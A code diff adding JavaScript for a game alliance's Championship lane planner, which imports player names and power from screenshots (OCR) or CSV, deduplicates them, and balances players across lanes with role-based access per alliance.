+// Which alliance tag, if any, the signed-in user is allowed to view/edit
+// Championship data for. An R4/officer is hard-locked to their own member
+// record's alliance — there is no UI path for them to type or select a
+// different one. A full admin isn't tied to a single alliance in this app
+// (the permanent admin login has alliance: ""), so they pick which
+// alliance's dataset to look at via champViewingAlliance; nothing here
+// ever lets that choice come from free-form input, only from the actual
+// list of configured alliance tags (Store.alliances).
+function championshipAccessibleAlliance(user) {
+  if (!user) return null;
+  if (user.role === "officer") return user.alliance || null;
+  if (user.role === "admin") return champViewingAlliance || Store.alliances[0] || null;
+  return null;
+}
+function canAccessChampionship(user) {
+  return !!user && (user.role === "admin" || user.role === "officer");
+}
+
+function ensureChampWorking(allianceTag) {
+  if (!champWorking || champWorkingAlliance !== allianceTag) {
+    champWorking = getChampionshipForAlliance(allianceTag);
+    champWorkingAlliance = allianceTag;
+    champDirty = false;
+  }
+  return champWorking;
+}
+
+function champPlayerById(id) {
+  return champWorking.players.find((p) => p.id === id) || null;
+}
+
+function laneOf(id) {
+  return LANE_KEYS.find((k) => (champWorking.lanes[k] || []).includes(id)) || null;
+}
+
+function champUnassignedIds() {
+  const assigned = new Set(LANE_KEYS.flatMap((k) => champWorking.lanes[k] || []));
+  return champWorking.players.filter((p) => !assigned.has(p.id)).map((p) => p.id);
+}
+
+function champLaneTotal(key) {
+  return (champWorking.lanes[key] || []).reduce((sum, id) => sum + (champPlayerById(id)?.power || 0), 0);
+}
+
+function newChampPlayerId() {
+  return "cp_" + Date.now().toString(36) + Math.random().toString(36).slice(2, 8);
+}
+
+// Merges one screenshot's parsed rows (from parseChampionshipOcrText in
+// data.js — each { name, power, needsReview }) into the working roster.
+// Duplicate detection is primarily by Gamer Name (case-insensitive, exact
+// text otherwise — full Unicode names are never simplified), which is what
+// catches the same player appearing across overlapping screenshots (and
+// the fixed "selected player" card that can sit at the bottom of every
+// screenshot while scrolling). Power is not part of the dedupe key — two
+// different players can share a power value — but a row with NO usable
+// name at all (OCR dropped it) is never deduped against another nameless
+// row, since there's no way to tell whether they're the same person; it's
+// always added as its own "Needs Review" entry instead. Returns
+// { added, duplicates } so the caller can report accurate import stats.
+function mergeChampionshipImports(found) {
+  const existingKeys = new Set(
+    champWorking.players.filter((p) => p.name && p.name.trim()).map((p) => p.name.trim().toLowerCase())
+  );
+  const seenThisBatch = new Set();
+  let added = 0;
+  let duplicates = 0;
+  found.forEach((f) => {
+    const key = (f.name || "").trim().toLowerCase();
+    if (key) {
+      if (existingKeys.has(key) || seenThisBatch.has(key)) {
+        duplicates++;
+        return;
+      }
+      seenThisBatch.add(key);
+      existingKeys.add(key);
+    }
+    champWorking.players.push({
+      id: newChampPlayerId(),
+      name: f.name ? f.name.trim() : "",
+      power: f.power || 0,
+      needsReview: !!f.needsReview,
+    });
+    added++;
+  });
+  if (added) champDirty = true;
+  return { added, duplicates };
+}
+
+// Moves a player into targetLane (one of LANE_KEYS), or out to "unassigned"
+// when targetLane is falsy. Refuses (with an alert, no partial change) if
+// the target lane is already at the 20-player cap.
+function moveChampionshipPlayer(id, targetLane) {
+  if (targetLane && (champWorking.lanes[targetLane] || []).length >= CHAMPIONSHIP_LANE_CAP && laneOf(id) !== targetLane) {
+    alert(`${LANE_LABELS[targetLane]} lane is already full (${CHAMPIONSHIP_LANE_CAP}/${CHAMPIONSHIP_LANE_CAP}).`);
+    return false;
+  }
+  LANE_KEYS.forEach((k) => { champWorking.lanes[k] = (champWorking.lanes[k] || []).filter((pid) => pid !== id); });
+  if (targetLane && LANE_KEYS.includes(targetLane)) champWorking.lanes[targetLane].push(id);
+  champDirty = true;
+  return true;
+}
+
+// Swaps two players' lane assignments (either side may currently be
+// "unassigned") — always allowed, since a straight swap can never push a
+// lane past its existing size, let alone its cap.
+function swapChampionshipPlayers(idA, idB) {
+  if (idA === idB) return;
+  const laneA = laneOf(idA);
+  const laneB = laneOf(idB);
+  if (laneA === laneB) return; // both unassigned, or already in the same lane — nothing to do
+  LANE_KEYS.forEach((k) => {
+    champWorking.lanes[k] = champWorking.lanes[k].filter((pid) => pid !== idA && pid !== idB);
+  });
+  if (laneB) champWorking.lanes[laneB].push(idA);
+  if (laneA) champWorking.lanes[laneA].push(idB);
+  champDirty = true;
+}
+
+function deleteChampionshipPlayer(id) {
+  LANE_KEYS.forEach((k) => { champWorking.lanes[k] = (champWorking.lanes[k] || []).filter((pid) => pid !== id); });
+  champWorking.players = champWorking.players.filter((p) => p.id !== id);
+  champDirty = true;
+}
+
+function championshipPlayerRowHtml(p) {
+  if (!p) return "";
+  const displayName = p.name && p.name.trim() ? escapeHtml(p.name) : "(unrecognized name)";
+  return `
+    <div class="rank-item" draggable="true" data-cpid="${p.id}">
+      <div class="left">
+        <span class="name">${displayName}</span>
+        ${p.needsReview ? `<span class="desc" style="color:var(--accent-amber);">⚠ needs review</span>` : ""}
+      </div>
+      <span class="score">${formatFullNumber(p.power)}</span>
+    </div>
+  `;
+}
+
+function championshipLanePanelHtml(key, isOverflow, w, total) {
+  const ids = w.lanes[key] || [];
+  return `
+    <div class="panel">
+      <div class="planner-header">
+        <strong style="color:var(--accent-green);">${LANE_LABELS[key]}</strong>
+        <span class="status-badge ${isOverflow ? "planned" : "done"}">${isOverflow ? "OVERFLOW" : "PRIMARY"}</span>
+      </div>
+      <div class="summary-row"><span class="k">PLAYERS</span><span class="v">${ids.length} / ${CHAMPIONSHIP_LANE_CAP}</span></div>
+      <div class="summary-row"><span class="k">TOTAL POWER</span><span class="v">${formatFullNumber(total)}</span></div>
+      <div class="lane-drop" data-lanedrop="${key}" style="min-height:60px;margin-top:8px;">
+        ${
+          ids.length
+            ? `<div class="rank-list">${ids.map((id) => championshipPlayerRowHtml(champPlayerById(id))).join("")}</div>`
+            : `<div class="empty">Drop players here.</div>`
+        }
+      </div>
+    </div>
+  `;
+}
+
+function renderChampionship(el) {
+  const user = Store.currentUser;
+  if (!user) {
+    el.innerHTML = `
+      <div class="panel" style="text-align:center;padding:32px 20px;">
+        <div class="eyebrow" style="color:var(--accent-green);margin-bottom:10px;">SIGN IN REQUIRED</div>
+        <p style="font-size:12.5px;color:var(--text-dim);margin:0 0 16px;">The Alliance Championship planner is for alliance leadership. Sign in to continue.</p>
+        <button class="btn primary" id="chGoSignIn">Sign in</button>
+      </div>
+    `;
+    el.querySelector("#chGoSignIn").onclick = openSignIn;
+    return;
+  }
+  if (!canAccessChampionship(user)) {
+    el.innerHTML = `
+      <div class="eyebrow">// ALLIANCE CHAMPIONSHIP</div>
+      <h1 class="page-title" style="color:var(--accent-green)">championship</h1>
+      <div class="panel gate">
+        <p>This tool is for alliance leadership — Admin or R4.</p>
+        <p style="font-size:12px;">Signed in as ${escapeHtml(user.name)} (${roleLabel(user.role)}) — ask an admin for access if you need to plan Championship lanes.</p>
+      </div>
+    `;
+    return;
+  }
+  if (user.role === "officer" && !user.alliance) {
+    el.innerHTML = `
+      <div class="eyebrow">// ALLIANCE CHAMPIONSHIP</div>
+      <h1 class="page-title" style="color:var(--accent-green)">championship</h1>
+      <div class="panel gate">
+        <p>Your account isn't assigned to an alliance yet.</p>
+        <p style="font-size:12px;">Ask an admin to set your alliance in Admin → Members — Championship data is scoped per alliance, so R4 access needs an alliance tag first.</p>
+      </div>
+    `;
+    return;
+  }
+  const alliances = Store.alliances;
+  if (user.role === "admin" && !champViewingAlliance) champViewingAlliance = alliances[0] || null;
+  const allianceTag = championshipAccessibleAlliance(user);
+  if (!allianceTag) {
+    el.innerHTML = `
+      <div class="eyebrow">// ALLIANCE CHAMPIONSHIP</div>
+      <h1 class="page-title" style="color:var(--accent-green)">championship</h1>
+      <div class="panel gate">
+        <p>No alliance tags exist yet.</p>
+        <p style="font-size:12px;">Add one in Admin → Alliances before using Alliance Championship — every dataset here is scoped to a specific alliance.</p>
+      </div>
+    `;
+    return;
+  }
+
+  ensureChampWorking(allianceTag);
+  const w = champWorking;
+  const sortedPlayers = [...w.players].sort((a, b) => b.power - a.power);
+  const primaryKeys = PRIMARY_PAIR_LANES[w.primaryPair] || PRIMARY_PAIR_LANES.left_right;
+  const overflowKey = LANE_KEYS.find((k) => !primaryKeys.includes(k));
+  const totals = Object.fromEntries(LANE_KEYS.map((k) => [k, champLaneTotal(k)]));
+  const primaryDiff = Math.abs(totals[primaryKeys[0]] - totals[primaryKeys[1]]);
+  const unassignedIds = champUnassignedIds();
+  const hasLaneData = LANE_KEYS.some((k) => (w.lanes[k] || []).length > 0);
+  const showLanes = sortedPlayers.length > 0;
+
+  el.innerHTML = `
+    <div class="eyebrow">// ALLIANCE CHAMPIONSHIP</div>
+    <h1 class="page-title" style="color:var(--accent-green)">championship</h1>
+    <p style="font-size:12.5px;color:var(--text-dim);margin:-6px 0 16px;">
+      Import the Championship player list from screenshots or a dataset, review it, then auto-balance two maxed 20-player lanes as evenly as possible — everyone else overflows into the third lane. Separate from bag planning; nothing here touches member accounts, PINs, or bag data.
+    </p>
+    ${
+      user.role === "admin"
+        ? `<div class="field" style="max-width:220px;margin-bottom:16px;">
+            <label>VIEWING ALLIANCE</label>
+            <select id="champAllianceSelect">
+              ${alliances.map((a) => `<option value="${escapeHtml(a)}" ${a === allianceTag ? "selected" : ""}>${escapeHtml(a)}</option>`).join("")}
+            </select>
+          </div>`
+        : `<p class="eyebrow" style="margin:-6px 0 16px;">ALLIANCE · <strong style="color:var(--accent-green);">${escapeHtml(allianceTag)}</strong></p>`
+    }
+
+    <div class="section-title">ADD PLAYERS</div>
+    <div class="pill-toggle" style="margin-bottom:10px;">
+      <button data-importmode="screenshots" class="${champImportMode === "screenshots" ? "active" : ""}">UPLOAD SCREENSHOTS</button>
+      <button data-importmode="dataset" class="${champImportMode === "dataset" ? "active" : ""}">IMPORT DATASET</button>
+    </div>
+    <div style="margin-bottom:14px;">
+      <button class="btn small" id="champAddPlayerManual">+ Add Player Manually</button>
+    </div>
+
+    ${
+      champImportMode === "screenshots"
+        ? `
+    <div class="panel">
+      <p style="font-size:12px;color:var(--text-dim);margin:0 0 12px;">Upload one or more screenshots of the Alliance Championship player rankings. Overlapping screenshots are fine — players already on the list below won't be added twice.</p>
+      <div style="display:flex;gap:10px;flex-wrap:wrap;align-items:center;">
+        <input type="file" id="champFiles" accept="image/*" multiple style="max-width:280px;font-size:12px;color:var(--text-dim);" />
+        <button class="btn primary small" id="champProcess" ${champOcrBusy ? "disabled" : ""}>${champOcrBusy ? "Processing…" : "Process Screenshots"}</button>
+      </div>
+      ${champOcrStatus ? `<p style="font-size:11.5px;color:var(--text-faint);margin:10px 0 0;">${escapeHtml(champOcrStatus)}</p>` : ""}
+      ${
+        champScreenshotsProcessed > 0 || w.players.length > 0
+          ? `<div class="champ-stat-row" style="margin-top:12px;">
+              ${[
+                ["SCREENSHOTS PROCESSED", champScreenshotsProcessed],
+                ["UNIQUE PLAYERS FOUND", w.players.length],
+                ["DUPLICATES REMOVED", champDuplicatesRemoved],
+                ["NEEDS REVIEW", w.players.filter((p) => p.needsReview).length],
+              ]
+                .map(
+                  ([label, val]) => `
+                <div style="background:var(--panel-2);border:1px solid var(--border);border-radius:4px;padding:8px 10px;text-align:center;">
+                  <div style="font-size:9.5px;color:var(--text-faint);letter-spacing:.5px;">${label}</div>
+                  <div style="font-size:16px;font-weight:700;margin-top:2px;${label === "NEEDS REVIEW" && val > 0 ? "color:var(--accent-amber);" : ""}">${val}</div>
+                </div>`
+                )
+                .join("")}
+            </div>`
+          : ""
+      }
+    </div>`
+        : `
+    <div class="panel">
+      <p style="font-size:12px;color:var(--text-dim);margin:0 0 10px;">Paste CSV-style data (a <code>name,power</code> header row, then one row per player) or upload a matching .csv file. Only Gamer Name and Power are read — everything else about a player is ignored.</p>
+      <label style="display:block;font-size:10.5px;color:var(--text-faint);letter-spacing:1px;text-transform:uppercase;margin-bottom:6px;">Paste Player Dataset</label>
+      <textarea id="champDatasetText" class="feedback-input" style="min-height:150px;font-family:'SF Mono',Consolas,monospace;font-size:12px;" placeholder="name,power&#10;oakleygirl,1169&#10;Mjy,822&#10;Metal Adjacent,678">${escapeHtml(champDatasetText)}</textarea>
+      <div style="display:flex;gap:10px;flex-wrap:wrap;align-items:center;margin-top:10px;">
+        <input type="file" id="champCsvFile" accept=".csv,text/csv" style="max-width:240px;font-size:12px;color:var(--text-dim);" />
+        <button class="btn primary small" id="champPreviewImport" ${champImportBusy ? "disabled" : ""}>${champImportBusy ? "Reading…" : "Preview Import"}</button>
+      </div>
+    </div>`
+    }
+
+    ${
+      champImportPreview
+        ? `
+    <div class="section-title">DATASET IMPORT PREVIEW</div>
+    <div class="panel">
+      <div class="champ-stat-row" style="margin-bottom:14px;">
+        ${[
+          ["ROWS READ", champImportPreview.rowsRead],
+          ["VALID PLAYERS", champImportPreview.validPlayers],
+          ["DUPLICATES REMOVED", champImportPreview.duplicatesRemoved],
+          ["CONFLICTS", champImportPreview.conflicts],
+          ["INVALID ROWS", champImportPreview.invalidRows],
+        ]
+          .map(
+            ([label, val]) => `
+          <div style="background:var(--panel-2);border:1px solid var(--border);border-radius:4px;padding:8px 10px;text-align:center;">
+            <div style="font-size:9.5px;color:var(--text-faint);letter-spacing:.5px;">${label}</div>
+            <div style="font-size:16px;font-weight:700;margin-top:2px;${(label === "CONFLICTS" || label === "INVALID ROWS") && val > 0 ? "color:var(--accent-amber);" : ""}">${val}</div>
+          </div>`
+          )
+          .join("")}
+      </div>
+      ${
+        champImportPreview.rows.length
+          ? `<div style="overflow-x:auto;">
+              <table>
+                <thead><tr><th>GAMER NAME</th><th>POWER</th><th>STATUS</th><th></th></tr></thead>
+                <tbody>
+                  ${champImportPreview.rows
+                    .map(
+                      (r) => `
+                    <tr>
+                      <td><input type="text" data-previewname="${r.tempId}" value="${escapeHtml(r.name)}" style="width:100%;min-width:130px;background:var(--panel-2);border:1px solid var(--border);color:var(--text);padding:6px 8px;border-radius:4px;font-size:12.5px;" /></td>
+                      <td>
+                        ${
+                          r.category === "conflict"
+                            ? `<select data-previewconflict="${r.tempId}" style="background:var(--panel-2);border:1px solid var(--border);color:var(--text);padding:6px 8px;border-radius:4px;font-size:12px;">
+                                <option value="existing" ${r.chosenPower === r.existingPower ? "selected" : ""}>Keep existing (${formatFullNumber(r.existingPower)})</option>
+                                <option value="imported" ${r.chosenPower !== r.existingPower ? "selected" : ""}>Use imported (${formatFullNumber(r.power)})</option>
+                              </select>`
+                            : `<input type="text" inputmode="decimal" data-previewpower="${r.tempId}" value="${r.power ? formatFullNumber(r.power) : ""}" style="width:100%;min-width:90px;background:var(--panel-2);border:1px solid var(--border);color:var(--text);padding:6px 8px;border-radius:4px;font-size:12.5px;" />`
+                        }
+                      </td>
+                      <td><span class="status-badge ${r.category === "ready" ? "done" : "planned"}">${r.statusLabel.toUpperCase()}</span></td>
+                      <td><button class="btn small" data-previewremove="${r.tempId}" style="color:var(--accent-red);">remove</button></td>
+                    </tr>`
+                    )
+                    .join("")}
+                </tbody>
+              </table>
+            </div>`
+          : `<div class="empty">Nothing new to import — every row was already on the list with a matching power.</div>`
+      }
+      <div style="display:flex;gap:10px;margin-top:14px;flex-wrap:wrap;">
+        <button class="btn primary" id="champImportCommit">Import Players</button>
+        <button class="btn small" id="champImportCancel">Cancel</button>
+      </div>
+    </div>`
+        : ""
+    }
+
+    <div class="section-title">PLAYER LIST — REVIEW &amp; CORRECT</div>
+    <div class="panel">
+      <p style="font-size:12px;color:var(--text-dim);margin:0 0 12px;">Only Gamer Name and Troop Power are imported from screenshots — Order of Battle position, avatars, and everything else on the screen are ignored. Rows the OCR wasn't confident about are marked <strong style="color:var(--accent-amber);">Needs Review</strong> below — fix the name or power directly in the row rather than guessing; a row stays flagged until both are filled in.</p>
+      ${
+        sortedPlayers.length
+          ? `<div style="overflow-x:auto;">
+              <table>
+                <thead><tr><th>GAMER NAME</th><th>TROOP POWER</th><th>STATUS</th><th></th></tr></thead>
+                <tbody>
+                  ${sortedPlayers
+                    .map(
+                      (p) => `
+                    <tr>
+                      <td><input type="text" data-cpname="${p.id}" value="${escapeHtml(p.name || "")}" placeholder="(unrecognized name)" style="width:100%;min-width:140px;background:var(--panel-2);border:1px solid var(--border);color:var(--text);padding:6px 8px;border-radius:4px;font-size:12.5px;" /></td>
+                      <td><input type="text" inputmode="decimal" data-cppower="${p.id}" value="${p.power ? formatFullNumber(p.power) : ""}" placeholder="0" style="width:100%;min-width:110px;background:var(--panel-2);border:1px solid var(--border);color:var(--text);padding:6px 8px;border-radius:4px;font-size:12.5px;" /></td>
+                      <td>${p.needsReview ? `<span class="status-badge planned">NEEDS REVIEW</span>` : `<span class="status-badge done">CONFIRMED</span>`}</td>
+                      <td><button class="btn small" data-cpdel="${p.id}" style="color:var(--accent-red);">delete</button></td>
+                    </tr>`
+                    )
+                    .join("")}
+                </tbody>
+              </table>
+            </div>`
+          : `<div class="empty">No players imported yet — upload screenshots above or add one manually.</div>`
+      }
+      <button class="btn small" id="champAddPlayer" style="margin-top:12px;">+ Add Player</button>
+    </div>
+
+    <div class="section-title">PRIMARY LANES</div>
+    <div class="panel">
+      <p style="font-size:12px;color:var(--text-dim);margin:0 0 12px;">Choose which two lanes get filled to 20/20 with the strongest, most evenly-matched players. The lane left out becomes the overflow lane.</p>
+      <div class="pill-toggle">
+        <button data-pair="left_right" class="${w.primaryPair === "left_right" ? "active" : ""}">LEFT + RIGHT</button>
+        <button data-pair="left_middle" class="${w.primaryPair === "left_middle" ? "active" : ""}">LEFT + MIDDLE</button>
+        <button data-pair="middle_right" class="${w.primaryPair === "middle_right" ? "active" : ""}">MIDDLE + RIGHT</button>
+      </div>
+      <button class="btn primary" id="champBalance" style="margin-top:14px;">${hasLaneData ? "Rebalance Lanes" : "Balance Lanes"}</button>
+      ${
+        w.players.length > CHAMPIONSHIP_TOTAL_CAP
+          ? `<p style="font-size:11.5px;color:var(--accent-amber);margin:10px 0 0;">${w.players.length - CHAMPIONSHIP_TOTAL_CAP} lowest-power player(s) beyond the ${CHAMPIONSHIP_TOTAL_CAP}-player cap will be left unassigned.</p>`
+          : ""
+      }
+    </div>
+
+    ${
+      showLanes
+        ? `
+    <div class="section-title">RESULTS</div>
+    <div class="summary-row" style="margin-bottom:12px;">
+      <span class="k">PRIMARY LANES POWER DIFFERENCE (${LANE_LABELS[primaryKeys[0]]} vs ${LANE_LABELS[primaryKeys[1]]})</span>
+      <span class="v" style="color:var(--accent-green);">${formatFullNumber(primaryDiff)}</span>
+    </div>
+    <div class="lane-grid">
+      ${LANE_KEYS.map((key) => championshipLanePanelHtml(key, key === overflowKey, w, totals[key])).join("")}
+    </div>
+    <div class="section-title">UNASSIGNED${w.players.length > CHAMPIONSHIP_TOTAL_CAP ? ` <span style="color:var(--text-faint);font-weight:400;">(includes anyone beyond the ${CHAMPIONSHIP_TOTAL_CAP}-player cap)</span>` : ""}</div>
+    <div class="panel lane-drop" data-lanedrop="" style="min-height:60px;">
+      ${
+        unassignedIds.length
+          ? `<div class="rank-list">${unassignedIds.map((id) => championshipPlayerRowHtml(champPlayerById(id))).join("")}</div>`
+          : `<div class="empty">Everyone is assigned to a lane.</div>`
+      }
+    </div>`
+        : ""
+    }
+
+    <div style="display:flex;gap:10px;margin-top:20px;flex-wrap:wrap;align-items:center;">
+      <button class="btn primary" id="champSave">Save ${escapeHtml(allianceTag)} Championship Plan</button>
+      <button class="btn small" id="champClear" style="color:var(--accent-red);">Clear ${escapeHtml(allianceTag)} Championship Plan</button>
+      ${champDirty ? `<span style="font-size:11.5px;color:var(--accent-amber);">Unsaved changes</span>` : ""}
+    </div>
+  `;
+
+  wireChampionshipHandlers(el, allianceTag);
+}
+
+function wireChampionshipHandlers(el, allianceTag) {
+  el.querySelector("#champAllianceSelect")?.addEventListener("change", (e) => {
+    champViewingAlliance = e.target.value;
+    champWorking = null; // force ensureChampWorking() to reload the newly-selected alliance's data
+    champImportPreview = null;
+    champDatasetText = "";
+    champImportMode = "screenshots";
+    champScreenshotsProcessed = 0;
+    champDuplicatesRemoved = 0;
+    champOcrStatus = "";
+    renderChampionship(el);
+  });
+
+  el.querySelectorAll("[data-importmode]").forEach((btn) =>
+    btn.addEventListener("click", () => {
+      champImportMode = btn.dataset.importmode;
+      renderChampionship(el);
+    })
+  );
+
+  const addPlayerManually = () => {
+    champWorking.players.push({ id: newChampPlayerId(), name: "New Player", power: 0, needsReview: false });
+    champDirty = true;
+    renderChampionship(el);
+  };
+  el.querySelector("#champAddPlayerManual")?.addEventListener("click", addPlayerManually);
+
+  el.querySelector("#champProcess")?.addEventListener("click", async () => {
+    const input = el.querySelector("#champFiles");
+    const files = input?.files ? Array.from(input.files) : [];
+    if (!files.length) { alert("Choose one or more screenshot images first."); return; }
+    if (typeof Tesseract === "undefined") {
+      champOcrStatus = "OCR library failed to load — check your internet connection and try again.";
+      renderChampionship(el);
+      return;
+    }
+    champOcrBusy = true;
+    champOcrStatus = `Reading ${files.length} screenshot${files.length === 1 ? "" : "s"}…`;
+    renderChampionship(el);
+    let totalAdded = 0;
+    let totalDuplicates = 0;
+    try {
+      for (let i = 0; i < files.length; i++) {
+        champOcrStatus = `Reading screenshot ${i + 1} of ${files.length}…`;
+        const { data } = await Tesseract.recognize(files[i], "eng");
+        const found = parseChampionshipOcrText(data.text);
+        const { added, duplicates } = mergeChampionshipImports(found);
+        totalAdded += added;
+        totalDuplicates += duplicates;
+      }
+      champScreenshotsProcessed += files.length;
+      champDuplicatesRemoved += totalDuplicates;
+      champOcrStatus = `Done — added ${totalAdded} new player${totalAdded === 1 ? "" : "s"} (${totalDuplicates} duplicate${totalDuplicates === 1 ? "" : "s"} skipped) from ${files.length} screenshot${files.length === 1 ? "" : "s"}. Review the list below before balancing.`;
+    } catch (err) {
+      console.error("Championship OCR failed:", err);
+      champOcrStatus = "Couldn't read one of those screenshots — try a clearer image, or add players manually below.";
+    }
+    champOcrBusy = false;
+    renderChampionship(el);
+  });
+
+  el.querySelector("#champAddPlayer")?.addEventListener("click", addPlayerManually);
+
+  // ---- Dataset import (paste or .csv upload) ----------------------------
+  el.querySelector("#champDatasetText")?.addEventListener("input", (e) => {
+    champDatasetText = e.target.value; // no re-render needed — just keep it in sync for Preview Import
+  });
+
+  el.querySelector("#champPreviewImport")?.addEventListener("click", async () => {
+    const fileInput = el.querySelector("#champCsvFile");
+    const file = fileInput?.files?.[0];
+    let text = champDatasetText;
+    if (file) {
+      champImportBusy = true;
+      renderChampionship(el);
+      try {
+        text = await file.text();
+        champDatasetText = text;
+      } catch (err) {
+        console.error("Couldn't read the uploaded CSV file:", err);
+        champImportBusy = false;
+        renderChampionship(el);
+        alert("Couldn't read that file — try again or paste the dataset instead.");
+        return;
+      }
+      champImportBusy = false;
+    }
+    const parsed = parseChampionshipDataset(text);
+    if (!parsed.rows.length) {
+      renderChampionship(el);
+      alert("Paste a dataset or choose a CSV file first.");
+      return;
+    }
+    champImportPreview = buildChampionshipImportPreview(parsed.rows, champWorking.players);
+    renderChampionship(el);
+  });
+
+  el.querySelectorAll("[data-previewname]").forEach((inp) =>
+    inp.addEventListener("change", () => {
+      const row = champImportPreview?.rows.find((r) => r.tempId === inp.dataset.previewname);
+      if (row) row.name = inp.value.trim();
+    })
+  );
+  el.querySelectorAll("[data-previewpower]").forEach((inp) =>
+    inp.addEventListener("change", () => {
+      const row = champImportPreview?.rows.find((r) => r.tempId === inp.dataset.previewpower);
+      const parsed = parsePowerToken(inp.value);
+      if (row && parsed != null) row.power = parsed;
+    })
+  );
+  el.querySelectorAll("[data-previewconflict]").forEach((sel) =>
+    sel.addEventListener("change", () => {
+      const row = champImportPreview?.rows.find((r) => r.tempId === sel.dataset.previewconflict);
+      if (row) row.chosenPower = sel.value === "imported" ? row.power : row.existingPower;
+    })
+  );
+  el.querySelectorAll("[data-previewremove]").forEach((btn) =>
+    btn.addEventListener("click", () => {
+      if (!champImportPreview) return;
+      champImportPreview.rows = champImportPreview.rows.filter((r) => r.tempId !== btn.dataset.previewremove);
+      renderChampionship(el);
+    })
+  );
+
+  el.querySelector("#champImportCommit")?.addEventListener("click", () => {
+    if (!champImportPreview) return;
+    champImportPreview.rows.forEach((r) => {
+      if (r.category === "conflict") {
+        const existing = champWorking.players.find((p) => (p.name || "").trim().toLowerCase() === r.name.trim().toLowerCase());
+        if (existing) {
+          existing.power = r.chosenPower;
+          existing.needsReview = false;
+        }
+        return;
+      }
+      champWorking.players.push({
+        id: newChampPlayerId(),
+        name: r.name ? r.name.trim() : "",
+        power: r.power || 0,
+        needsReview: r.category === "invalid" || !r.name.trim() || !r.power,
+      });
+    });
+    champDirty = true;
+    champImportPreview = null;
+    champDatasetText = "";
+    renderChampionship(el);
+  });
+
+  el.querySelector("#champImportCancel")?.addEventListener("click", () => {
+    champImportPreview = null;
+    renderChampionship(el);
+  });
+
+  // Editing name/power on a flagged row clears "Needs Review" the moment
+  // both fields hold something usable — the admin fixing the row IS the
+  // review, no separate "confirm" action needed.
+  el.querySelectorAll("[data-cpname]").forEach((inp) =>
+    inp.addEventListener("change", () => {
+      const p = champPlayerById(inp.dataset.cpname);
+      if (p) {
+        p.name = inp.value.trim();
+        p.needsReview = !p.name || !p.power || p.power <= 0;
+        champDirty = true;
+      }
+      renderChampionship(el);
+    })
+  );
+  el.querySelectorAll("[data-cppower]").forEach((inp) =>
+    inp.addEventListener("change", () => {
+      const p = champPlayerById(inp.dataset.cppower);
+      const parsed = parsePowerToken(inp.value);
+      if (p && parsed != null) {
+        p.power = parsed;
+        p.needsReview = !p.name || !p.power || p.power <= 0;
+        champDirty = true;
+      }
+      renderChampionship(el);
+    })
+  );
+  el.querySelectorAll("[data-cpdel]").forEach((btn) =>
+    btn.addEventListener("click", () => {
+      deleteChampionshipPlayer(btn.dataset.cpdel);
+      renderChampionship(el);
+    })
+  );
+
+  el.querySelectorAll("[data-pair]").forEach((btn) =>
+    btn.addEventListener("click", () => {
+      champWorking.primaryPair = btn.dataset.pair;
+      champDirty = true;
+      renderChampionship(el);
+    })
+  );
+
+  el.querySelector("#champBalance")?.addEventListener("click", () => {
+    if (!champWorking.players.length) { alert("Import or add at least one player first."); return; }
+    champWorking.lanes = balanceChampionshipLanes(champWorking.players, champWorking.primaryPair);
+    champDirty = true;
+    renderChampionship(el);
+  });
+
+  // Drag-and-drop: drop a player row onto another player's row to swap the
+  // two, or onto a lane's drop-zone (including the "Unassigned" panel) to
+  // move it there outright.
+  el.querySelectorAll("[data-cpid]").forEach((row) => {
+    row.addEventListener("dragstart", (e) => {
+      champDragId = row.dataset.cpid;
+      row.classList.add("dragging");
+      e.dataTransfer.effectAllowed = "move";
+      e.dataTransfer.setData("text/plain", champDragId);
+    });
+    row.addEventListener("dragend", () => { row.classList.remove("dragging"); champDragId = null; });
+    row.addEventListener("dragover", (e) => e.preventDefault());
+    row.addEventListener("drop", (e) => {
+      e.preventDefault();
+      e.stopPropagation();
+      const droppedId = champDragId || e.dataTransfer.getData("text/plain");
+      const targetId = row.dataset.cpid;
+      if (droppedId && targetId && droppedId !== targetId) swapChampionshipPlayers(droppedId, targetId);
+      champDragId = null;
+      renderChampionship(el);
+    });
+  });
+  el.querySelectorAll("[data-lanedrop]").forEach((zone) => {
+    zone.addEventListener("dragover", (e) => { e.preventDefault(); zone.classList.add("dragover"); });
+    zone.addEventListener("dragleave", () => zone.classList.remove("dragover"));
+    zone.addEventListener("drop", (e) => {
+      e.preventDefault();
+      zone.classList.remove("dragover");
+      const droppedId = champDragId || e.dataTransfer.getData("text/plain");
+      champDragId = null;
+      if (!droppedId) return;
+      moveChampionshipPlayer(droppedId, zone.dataset.lanedrop || null);
+      renderChampionship(el);
+    });
+  });
+
+  el.querySelector("#champSave")?.addEventListener("click", () => {
+    setChampionshipForAlliance(allianceTag, {
+      players: champWorking.players.map((p) => ({ ...p })),
+      lanes: {
+        left: [...champWorking.lanes.left],
+        middle: [...champWorking.lanes.middle],
+        right: [...champWorking.lanes.right],
+      },
+      primaryPair: champWorking.primaryPair,
+    });
+    champDirty = false;
+    renderChampionship(el);
+  });
+
+  el.querySelector("#champClear")?.addEventListener("click", () => {
+    const confirmed = confirm(
+      `Are you sure you want to clear the ${allianceTag} Championship plan? This will permanently remove ${allianceTag}'s imported player list, screenshot/dataset data, and lane assignments. Member accounts, bags, time slots, and every OTHER alliance's Championship data will NOT be affected.`
+    );
+    if (!confirmed) return;
+    clearChampionshipForAlliance(allianceTag);
+    champWorking = null; // force ensureChampWorking() to reload the fresh empty state
+    champDirty = false;
+    champOcrStatus = "";
+    champScreenshotsProcessed = 0;
+    champDuplicatesRemoved = 0;
+    champImportPreview = null;
+    champDatasetText = "";
+    renderChampionship(el);
+  });
 }
 
 </script>
